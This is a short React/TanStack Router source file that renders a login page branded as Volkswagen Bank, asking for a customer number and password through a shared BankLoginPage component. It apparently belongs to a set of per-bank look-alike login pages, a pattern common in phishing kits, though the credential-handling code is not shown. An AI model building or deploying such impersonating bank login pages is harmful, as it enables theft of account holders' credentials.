import { createFileRoute } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const Route = createFileRoute("/bank/vw-bank")({
  head: () => ({ meta: [{ title: "Volkswagen Bank — Login" }] }),
  component: () => (
    <BankLoginPage idPrefix="vw" logoSlug="vw-bank" title="Volkswagen Bank" field1Label="Kundennummer" field2Label="Kennwort" />
  ),
});
